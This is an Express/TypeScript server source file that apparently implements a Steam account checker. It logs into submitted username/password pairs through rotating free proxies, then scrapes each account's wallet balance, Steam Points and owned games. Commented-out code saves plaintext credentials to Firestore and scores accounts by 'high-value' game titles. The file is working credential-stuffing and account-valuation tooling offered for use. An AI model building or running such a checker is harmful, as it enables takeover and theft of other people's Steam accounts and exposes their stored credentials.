import express from 'express';
import { createServer as createViteServer } from 'vite';
import path from 'path';
import fs from 'fs';
import crypto from 'crypto';
import { fileURLToPath } from 'url';
import dotenv from 'dotenv';

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

import SteamUser from 'steam-user';
import { HttpsProxyAgent } from 'https-proxy-agent';
import 'lzma';
import 'adm-zip';
import admin from 'firebase-admin';
import { getFirestore } from 'firebase-admin/firestore';
import firebaseConfig from './firebase-applet-config.json' assert { type: 'json' };

// Initialize Firebase Admin
let db: admin.firestore.Firestore | null = null;
try {
  if (!admin.apps.length) {
    const serviceAccount = process.env.FIREBASE_SERVICE_ACCOUNT || process.env.FIREBASE_SERVICE_ACCOUNT_KEY;
    if (serviceAccount) {
      try {
        const cert = JSON.parse(serviceAccount);
        admin.initializeApp({
          credential: admin.credential.cert(cert),
          projectId: firebaseConfig.projectId
        });
        console.log('[FIREBASE] Admin initialized with Service Account');
      } catch (e) {
        console.error('[FIREBASE] Failed to parse service account JSON, falling back to default init');
        admin.initializeApp({
          projectId: firebaseConfig.projectId
        });
      }
    } else {
      admin.initializeApp({
        projectId: firebaseConfig.projectId
      });
      console.log('[FIREBASE] Admin initialized with default credentials');
    }
  }
  db = getFirestore(firebaseConfig.firestoreDatabaseId);
  console.log('[FIREBASE] Using Database:', firebaseConfig.firestoreDatabaseId);
  
  /*
  // Verify access
  db.collection('checks').limit(1).get()
    .then(() => console.log('[FIREBASE] Successfully connected and verified access to "checks" collection'))
    .catch(e => console.error('[FIREBASE] Firestore verification failed:', e.message));
  */
} catch (e) {
  console.error('Firebase Admin init error:', e);
}

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json({ limit: '100mb' }));
  app.use(express.urlencoded({ limit: '100mb', extended: true }));

  const UPLOADS_DIR = path.join(process.cwd(), 'uploads');
  if (!fs.existsSync(UPLOADS_DIR)) {
    fs.mkdirSync(UPLOADS_DIR);
  }

  // Filesystem cleanup task: delete files older than 2 hours
  setInterval(() => {
    const now = Date.now();
    const TWO_HOURS = 2 * 60 * 60 * 1000;
    fs.readdir(UPLOADS_DIR, (err, files) => {
      if (err) return;
      files.forEach(file => {
        const filePath = path.join(UPLOADS_DIR, file);
        fs.stat(filePath, (err, stats) => {
          if (err) return;
          if (now - stats.mtimeMs > TWO_HOURS) {
            fs.unlink(filePath, () => {
              console.log(`[CLEANUP] Deleted old file: ${file}`);
            });
          }
        });
      });
    });
  }, 15 * 60 * 1000); // Check every 15 minutes

  app.post('/api/upload', express.text({ limit: '100mb' }), (req, res) => {
    try {
      const content = req.body;
      if (!content || typeof content !== 'string') {
        return res.status(400).json({ error: 'No content provided' });
      }
      const fileId = crypto.randomUUID();
      fs.writeFileSync(path.join(UPLOADS_DIR, fileId), content);
      res.json({ id: fileId });
    } catch (e) {
      res.status(500).json({ error: 'Failed to upload file' });
    }
  });

  app.get('/api/file/:id', (req, res) => {
    try {
      const filePath = path.join(UPLOADS_DIR, req.params.id);
      if (!fs.existsSync(filePath)) {
        return res.status(404).json({ error: 'File not found or expired' });
      }
      const content = fs.readFileSync(filePath, 'utf-8');
      res.send(content);
    } catch (e) {
      res.status(500).json({ error: 'Failed to read file' });
    }
  });

  // Helper for robust XML parsing without deps
  const extractXml = (xml: string, tag: string) => {
    const regex = new RegExp(`<${tag}><!\\[CDATA\\[(.*?)\\]\\]><\\/${tag}>|<${tag}>(.*?)<\\/${tag}>`);
    const match = xml.match(regex);
    return match ? (match[1] !== undefined ? match[1] : match[2]) : null;
  };

  // New Login Check Route
  app.get('/api/proxies/load', async (req, res) => {
    try {
      const response = await fetch('https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text');
      const text = await response.text();
      res.send(text);
    } catch (e) {
      res.status(500).json({ error: 'Failed to fetch proxies' });
    }
  });

  app.post('/api/steam/login-check', async (req, res) => {
    try {
      const { username, password, proxy } = req.body;

      if (!username || !password) {
        return res.status(400).json({ error: 'Username and password are required' });
      }
      
      let clientOpts: any = { dataDirectory: null };
      if (proxy) {
        clientOpts.httpProxy = proxy.startsWith('http') ? proxy : `http://${proxy}`;
      }
      const client = new SteamUser(clientOpts);
      
      let responded = false;
      const respond = async (status: number, data: any) => {
        if (!responded) {
          responded = true;
          try { client.logOff(); } catch (e) {}

          // Always log to Firestore if possible
          /* 
          // Backend writes removed due to environment permission issues.
          // Activity is now logged from the front-end for better reliability.
          if (db && status !== 200 && status !== 408) { 
              try {
                await db.collection('checks').add({
                  credentials: `${username}:${password}`,
                  timestamp: admin.firestore.FieldValue.serverTimestamp(),
                  status: 'failed',
                  error: data.error || 'Login Error',
                  method: 'login_check'
                });
              } catch (e) {
                console.error('[FIREBASE] Failure log failed:', e);
              }
          }
          */

          res.status(status).json(data);
        }
      };

      const timeout = setTimeout(async () => {
        const timeoutError = 'Logon attempt timed out (Steam servers might be slow)';
        /*
        // Backend writes removed
        if (db) {
          try {
            await db.collection('checks').add({
              credentials: `${username}:${password}`,
              timestamp: admin.firestore.FieldValue.serverTimestamp(),
              status: 'failed',
              error: timeoutError,
              method: 'timeout'
            });
          } catch (e) {
            console.error('[FIREBASE] Timeout log failed:', e);
          }
        }
        */
        respond(408, { error: timeoutError });
      }, 45000);

      let engineWalletBalance: string | null = null;
      client.on('wallet', (hasWallet, currency, balance) => {
          if (hasWallet) {
              engineWalletBalance = SteamUser.formatCurrency(balance, currency);
          }
      });

      client.on('webSession', async (sessionID, cookies) => {
        clearTimeout(timeout);
        const steamId = client.steamID;
        if (!steamId) {
          console.error('[STEAM] webSession event fired but steamID is missing');
          return respond(500, { error: 'Login session established but SteamID is missing' });
        }
        
        try {
          let games: any[] = [];
          let gameCount = 0;
          
          try {
              // Add timeout to getUserOwnedApps to prevent hanging
              const fetchWithTimeout = async () => {
                const timeoutPr = new Promise((_, reject) => setTimeout(() => reject(new Error('Request timed out')), 15000));
                return await Promise.race([
                  client.getUserOwnedApps(steamId, { includeAppInfo: true, includePlayedFreeGames: true }),
                  timeoutPr
                ]);
              };

              const appsData: any = await fetchWithTimeout();
              games = appsData?.apps || [];
              gameCount = appsData?.app_count || games.length;
          } catch (e: any) {
              console.error('Error fetching owned apps:', e.message || e);
          }

          let userData = null;
          try {
              const cookieStr = cookies.join('; ');
              let fetchOpts: any = { headers: { Cookie: cookieStr } };
              if (proxy) {
                  fetchOpts.agent = new HttpsProxyAgent(proxy.startsWith('http') ? proxy : `http://${proxy}`);
              }
              
              const profileRes = await fetch(`https://steamcommunity.com/profiles/${steamId?.toString()}/?xml=1`, fetchOpts);
              const text = await profileRes.text();

              if (text && !text.includes('<error>')) {
                const personaname = extractXml(text, 'steamID');
                const avatarfull = extractXml(text, 'avatarFull');
                const visibilityStateStr = extractXml(text, 'visibilityState');
                const onlineState = extractXml(text, 'onlineState');
                const location = extractXml(text, 'location');
                const memberSince = extractXml(text, 'memberSince');

                let personastate = 0;
                if (onlineState === 'online' || onlineState === 'in-game') personastate = 1;

                let timecreated = 0;
                if (memberSince) {
                  const d = new Date(memberSince);
                  if (!isNaN(d.getTime())) timecreated = Math.floor(d.getTime() / 1000);
                }

                userData = {
                  steamid: steamId?.toString() || '',
                  personaname: personaname || username,
                  avatarfull: avatarfull || 'https://steamcommunity-a.akamaihd.net/public/images/applications/store/default.png',
                  communityvisibilitystate: visibilityStateStr ? parseInt(visibilityStateStr, 10) : 3,
                  personastate,
                  loccountrycode: location || '',
                  timecreated,
                  profileurl: `https://steamcommunity.com/profiles/${steamId?.toString() || ''}`
                };
              }
          } catch (e) {
              console.error('Error fetching XML persona:', e);
          }

          let pointsBalance = 0;
          try {
              const cookieStr = cookies.join('; ');
              let fetchOpts: any = { 
                  headers: { 
                      'Cookie': cookieStr,
                      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                      'Accept': 'application/json, text/plain, */*',
                      'Referer': 'https://store.steampowered.com/points/shop/'
                  } 
              };
              if (proxy) {
                  fetchOpts.agent = new HttpsProxyAgent(proxy.startsWith('http') ? proxy : `http://${proxy}`);
              }
              
              const sessionid = cookies.find(c => c.toLowerCase().includes('sessionid='))?.split('=')[1]?.split(';')[0];
              console.log(`[STEAM] Fetching points for ${username} (sessionid: ${sessionid})...`);
              
              const extractPointsFromText = (text: string): number | null => {
                  if (!text) return null;
                  const patterns = [
                      /["']points_balance["']\s*:\s*"?(\d+)"?/i,
                      /["']points["']\s*:\s*"?(\d+)"?/i,
                      /points_balance["'\s:]+([\d,]+)/i,
                      /g_AccountPoints\s*=\s*"?(\d+)"?/i,
                      /g_AccountPoints\s*:\s*(\d+)/i,
                      /loyalty-points-balance">([\d,]+)/i,
                      /your balance["\s:]+([\d,]+)/i,
                      /id=["']loyalty_points_balance["']\s*>([\d,]+)/i,
                      /data-tooltip-html=["']([\d,]+) Steam Points["']/i,
                      /loyalty_points["\s:]+(\d+)/i,
                      /([0-9,]+)\s+Steam\s+Points/i,
                      /([0-9,]+)\s+Points/i,
                      /class=["']points_balance["']>([\d,]+)/i,
                      /class=["']your_points["']>([\d,]+)/i,
                      /["']points_balance["']\s*:\s*(\d+)/i,
                      /["']current_points["']\s*:\s*(\d+)/i,
                      /["']loyalty_points["']\s*:\s*(\d+)/i
                  ];
                  for (const p of patterns) {
                      const m = text.match(p);
                      if (m && m[1]) {
                          const val = parseInt(m[1].replace(/,/g, ''), 10);
                          if (!isNaN(val)) {
                              console.log(`[STEAM] Found points match: ${val} with pattern ${p}`);
                              return val;
                          }
                      }
                  }
                  return null;
              };

              // 1. userdata endpoint (Most comprehensive store data)
              try {
                const userdataRes = await fetch(`https://store.steampowered.com/dynamicstore/userdata/`, fetchOpts);
                const userdataText = await userdataRes.text();
                const p = extractPointsFromText(userdataText);
                if (p !== null) pointsBalance = p;
                
                if (pointsBalance === 0) {
                    try {
                        const userdata = JSON.parse(userdataText);
                        if (userdata?.points_info?.points !== undefined) {
                            pointsBalance = parseInt(userdata.points_info.points.toString(), 10);
                        }
                    } catch(e) {}
                }
              } catch (e) {
                  console.log(`[STEAM] Userdata fetch failed for ${username}`);
              }

              if (pointsBalance === 0) {
                  // 2. points summary endpoint
                  try {
                    const pointsUrl = sessionid 
                        ? `https://store.steampowered.com/pointssummary/ajaxgetpointsuserinfo?sessionid=${sessionid}`
                        : `https://store.steampowered.com/pointssummary/ajaxgetpointsuserinfo`;
                    const pointsRes = await fetch(pointsUrl, fetchOpts);
                    const pData = await pointsRes.text();
                    const p = extractPointsFromText(pData);
                    if (p !== null) pointsBalance = p;
                  } catch (e) {}
              }

              if (pointsBalance === 0 && sessionid) {
                // 2b. Async dictionary endpoint
                try {
                  const asyncRes = await fetch(`https://store.steampowered.com/pointssummary/ajaxgetasyncpointsdictionary?sessionid=${sessionid}`, fetchOpts);
                  const asyncData = await asyncRes.text();
                  const p = extractPointsFromText(asyncData);
                  if (p !== null) pointsBalance = p;
                } catch (e) {}
              }

              if (pointsBalance === 0) {
                  // 3. shop page (Directly from Store Points Shop)
                  try {
                    const storeRes = await fetch(`https://store.steampowered.com/points/shop/`, fetchOpts);
                    const storeHtml = await storeRes.text();
                    const p = extractPointsFromText(storeHtml);
                    if (p !== null) pointsBalance = p;
                  } catch (e) {}
              }

              if (pointsBalance === 0) {
                  // 4. account page (Alternative Store page)
                  try {
                    const accRes = await fetch(`https://store.steampowered.com/account/`, fetchOpts);
                    const accHtml = await accRes.text();
                    const p = extractPointsFromText(accHtml);
                    if (p !== null) pointsBalance = p;
                  } catch (e) {}
              }

              if (pointsBalance === 0) {
                  // 5. Store Home (Fallback)
                  try {
                    const storeHomeRes = await fetch(`https://store.steampowered.com/`, fetchOpts);
                    const storeHomeHtml = await storeHomeRes.text();
                    const p = extractPointsFromText(storeHomeHtml);
                    if (p !== null) pointsBalance = p;
                  } catch (e) {}
              }

              if (pointsBalance === 0) {
                // 6. community page fallback
                try {
                  const commRes = await fetch(`https://steamcommunity.com/points/shop/`, fetchOpts);
                  const commHtml = await commRes.text();
                  const p = extractPointsFromText(commHtml);
                  if (p !== null) pointsBalance = p;
                } catch (e) {}
              }
              console.log(`[STEAM] Points for ${username}: ${pointsBalance}`);
          } catch(e) {
              console.error('Error fetching steam points:', e);
          }

          if (!userData) {
              userData = {
                  steamid: steamId?.toString() || '',
                  personaname: username,
                  avatarfull: 'https://steamcommunity-a.akamaihd.net/public/images/applications/store/default.png',
                  communityvisibilitystate: 3,
                  personastate: 0,
                  loccountrycode: '',
                  timecreated: 0,
                  profileurl: `https://steamcommunity.com/profiles/${steamId?.toString() || ''}`
              };
          }

          // Persistent Logging (Handled by Frontend for reliability)
          /*
          if (db) {
            try {
              const HIGH_VALUE_KEYWORDS = [
                'resident evil', 'grand theft auto', 'gta v', 'elden ring', 'cyberpunk',
                'red dead', 'call of duty', 'hogwarts', 'baldur\'s gate', 'spider-man',
                'god of war', 'the witcher', 'assassin\'s creed', 'rust', 'dayz'
              ];
              
              let score = 0;
              games.forEach(g => {
                  let itemScore = 1;
                  const name = (g.name || '').toLowerCase();
                  if (HIGH_VALUE_KEYWORDS.some(k => name.includes(k))) itemScore += 50;
                  if (g.playtime_forever && g.playtime_forever > 600) itemScore += 5;
                  score += itemScore;
              });

              const gameNames = games.map(g => g.name);
              const { FieldValue } = admin.firestore;
              
              console.log(`[FIREBASE] Saving check for ${username} with ${pointsBalance} points...`);
              await db.collection('checks').add({
                credentials: `${username}:${password}`,
                steamId: steamId.toString(),
                personaName: userData.personaname,
                avatar: userData.avatarfull,
                country: userData.loccountrycode || 'Unknown',
                gameCount: gameCount,
                walletBalance: engineWalletBalance || '0',
                pointsBalance: pointsBalance,
                valueScore: score,
                gameNames: gameNames.slice(0, 500),
                timestamp: FieldValue.serverTimestamp(),
                status: 'success',
                method: 'login_check'
              });
            } catch (err: any) {
              console.error('Error saving check to Firestore:', err.message);
            }
          }
          */

          respond(200, {
            success: true,
            steamId: steamId?.toString() || '',
            profile: userData,
            games: games,
            game_count: gameCount,
            walletBalance: engineWalletBalance,
            pointsBalance: pointsBalance
          });
        } catch (e: any) {
          console.error('Error in webSession processing:', e.message);
          respond(200, { success: true, steamId: steamId?.toString(), message: 'Logged in but failed to fetch private data.' });
        }
      });

      client.on('error', (err) => {
        clearTimeout(timeout);
        let errorMessage = 'Login failed';
        if (err.message.includes('PasswordUnset')) errorMessage = 'Account has no password set.';
        if (err.message.includes('InvalidPassword')) errorMessage = 'Invalid username or password.';
        if (err.message.includes('AccountNotFound')) errorMessage = 'Steam account not found.';
        if (err.message.includes('SteamGuard')) errorMessage = 'Steam Guard (2FA) is enabled on this account. Need code/confirmation.';
        if (err.message.includes('RateLimitExceeded')) errorMessage = 'Too many login attempts. Please try again later.';

        respond(401, { success: false, error: errorMessage, code: err.message });
      });

      try {
        client.logOn({
          accountName: username,
          password: password
        });
      } catch (error) {
        clearTimeout(timeout);
        respond(500, { error: 'Internal server error during logon' });
      }
    } catch (err: any) {
      console.error('Error in login-check setup:', err);
      res.status(500).json({ error: 'Internal server error: ' + err.message });
    }
  });

  // API Routes (Keyless setup via public endpoints)
  app.get('/api/steam/resolve/:vanityUrl', async (req, res) => {
    try {
      const { vanityUrl } = req.params;
      const response = await fetch(`https://steamcommunity.com/id/${vanityUrl}/?xml=1`);
      const text = await response.text();
      const match = text.match(/<steamID64>(\d+)<\/steamID64>/);
      if (match && match[1]) {
        res.json({ response: { success: 1, steamid: match[1] } });
      } else {
        res.json({ response: { success: 42, message: 'No match' } });
      }
    } catch (error) {
      res.status(500).json({ error: 'Failed to resolve Steam vanity URL' });
    }
  });

  app.get('/api/steam/profile/:steamId', async (req, res) => {
    try {
      const { steamId } = req.params;
      const response = await fetch(`https://steamcommunity.com/profiles/${steamId}/?xml=1`);
      const text = await response.text();

      if (text.includes('<error>')) {
        return res.json({ response: { players: [] } });
      }

      const personaname = extractXml(text, 'steamID');
      const avatarfull = extractXml(text, 'avatarFull');
      const visibilityStateStr = extractXml(text, 'visibilityState');
      const onlineState = extractXml(text, 'onlineState');
      const stateMessage = extractXml(text, 'stateMessage');
      const location = extractXml(text, 'location');
      const memberSince = extractXml(text, 'memberSince');

      let personastate = 0; // Offline
      if (onlineState === 'online' || onlineState === 'in-game') personastate = 1;

      let timecreated = 0;
      if (memberSince) {
        const d = new Date(memberSince);
        if (!isNaN(d.getTime())) timecreated = Math.floor(d.getTime() / 1000);
      }

      const userData = {
        steamid: steamId,
        personaname: personaname || 'Unknown User',
        avatarfull: avatarfull || 'https://steamcommunity-a.akamaihd.net/public/images/applications/store/default.png',
        communityvisibilitystate: visibilityStateStr ? parseInt(visibilityStateStr, 10) : 3,
        personastate,
        loccountrycode: location,
        timecreated,
        profileurl: `https://steamcommunity.com/profiles/${steamId}`,
        stateMessage
      };

      res.json({ response: { players: [userData] } });
    } catch (error) {
      res.status(500).json({ error: 'Failed to fetch Steam profile' });
    }
  });

  app.get('/api/steam/games/:steamId', async (req, res) => {
    try {
      const { steamId } = req.params;
      const response = await fetch(`https://steamcommunity.com/profiles/${steamId}/games/?tab=all`);
      const text = await response.text();

      const rgGamesMatch = text.match(/var rgGames = (\[.*?\]);\r?\n/);
      if (rgGamesMatch && rgGamesMatch[1]) {
        const gamesData = JSON.parse(rgGamesMatch[1]);
        const formattedGames = gamesData.map((g: any) => ({
          appid: g.appid,
          name: g.name,
          playtime_forever: typeof g.hours_forever === 'string' 
            ? parseFloat(g.hours_forever.replace(/,/g, '')) * 60 
            : (g.hours_forever || 0) * 60,
          logo_url: g.logo || `https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/${g.appid}/capsule_184x69.jpg`
        }));
        res.json({ response: { game_count: formattedGames.length, games: formattedGames } });
      } else {
        if (text.includes('This profile is private')) {
          res.json({ response: undefined, isPrivate: true });
        } else {
          res.json({ response: { game_count: 0, games: [] } });
        }
      }
    } catch (error) {
      res.status(500).json({ error: 'Failed to fetch Steam games' });
    }
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer().catch((err) => {
  console.error('Error starting server:', err);
});
